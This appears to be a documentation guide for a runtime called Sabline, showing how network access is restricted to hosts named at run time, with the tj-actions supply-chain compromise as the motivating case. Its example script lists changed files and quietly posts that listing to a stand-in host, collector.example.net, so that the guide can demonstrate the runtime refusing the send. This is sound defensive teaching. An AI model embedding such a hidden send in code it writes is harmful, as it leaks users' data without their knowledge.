# Why should it have Internet access? Scripts that reach only the hosts you name

<!-- description: A tool that lists files has no reason to reach the network. In Sabline a run is granted one host or none, and a call to any other host is refused at the moment it is made. -->

> "E.g. when I run `fd`, `rg` or similar such tool, why should it have
> Internet access?" - a commenter on the
> [tj-actions/changed-files thread](https://news.ycombinator.com/item?id=43369437)
> on Hacker News, 15 March 2025.

The same question came up under every recent supply-chain attack: a GitHub
Action that lists changed files, a compression library, a colour-formatting
package - none of them needed the network, and each one could reach it,
because the code ran with everything its user could reach. This guide shows
the other arrangement: a Sabline program gets the network only if the person
running it grants it, and then only to the hosts they name.

> [!NOTE]
> **What this does not do.** It bounds programs written in Sabline, and
> nothing else: an npm package, a GitHub Action or a Python script the same
> model writes is untouched by it. And it is not a security boundary by
> itself - an interpreter in the program's own process enforces the budget,
> with the operating system holding the same budget underneath it fully on
> Linux and partly on macOS and Windows ([the threat model](../THREAT_MODEL.md)
> says what that leaves open).

**Last verified:** 2026-09-25. The examples below run on every push to this
repository, and fail the build if they stop refusing.

## A script that does its job, and one thing more

This is the shape of the tj-actions compromise, written small: list the files
a change touched, which is the whole of the task - and send what it saw to a
host of its own.

<!-- file: examples/guides/changed_files.vel -->
```vel
// Lists the files a change touched - the whole of its job. Like the
// compromised action, it also sends what it saw to a host of its own.
fn main() uses io, net {
    let changed = ["src/app.py", "src/util.py", "README.md"]
    let listing = ""
    for name in changed {
        print("changed: " + name)
        listing = listing + name + "\n"
    }
    check post("https://collector.example.net/drop", listing) {
        ok answer {
            print("sent")
        }
        fail why {
            print("could not send: " + why)
        }
    }
}
```

The signature says `uses io, net`: the program admits it wants the network.
That admission is a claim, not a permission.

## With no grant, no network

A run that names no budget gets the console and nothing else (the default
since 5.0). The task still happens; the send does not:

```console
$ sabline examples/guides/changed_files.vel
changed: src/app.py
changed: src/util.py
changed: README.md
error[E310] 'post' needs the 'net' effect, which this run does not allow (it allows: io)
  --> examples/guides/changed_files.vel, line 10
```

The refusal happens at the call, before any connection is opened, and the
program cannot catch it and carry on: E310 ends the run.

## One host, and only that host

Most real tools do need one host - a registry, an API. Grant that host, with
its port, and nothing else:

```console
$ sabline examples/guides/changed_files.vel --allow io,net:api.github.com:443
changed: src/app.py
changed: src/util.py
changed: README.md
error[E314] 'post' reaches host 'collector.example.net', which this run does not allow: host collector.example.net:443 is not in this run's net grants (allow it: --allow net:collector.example.net:443)
  --> examples/guides/changed_files.vel, line 10
```

The host is checked before the connection. A redirect from a granted host to
one that is not granted fails the request too, and that one the program is
told about, since it did not choose it. `net:*.example.com` grants one label
of subdomain, never the parent; `net:api.example.com@100` also caps the run
at a hundred requests.

## What to take from it

- Ask the question the commenter asked, of every script an agent hands you:
  which hosts does this need? Then grant exactly those.
- `sabline audit` answers the first half before anything runs - see
  [what a script will touch, before it runs](guide-before-it-runs.md).
- Where the code is not Sabline, a boundary around the whole process is the
  tool: [Sabline compared with Deno's permissions](compare-deno.md) and
  [with WASI](compare-wasi.md), from the same measured benchmark, losses
  first.
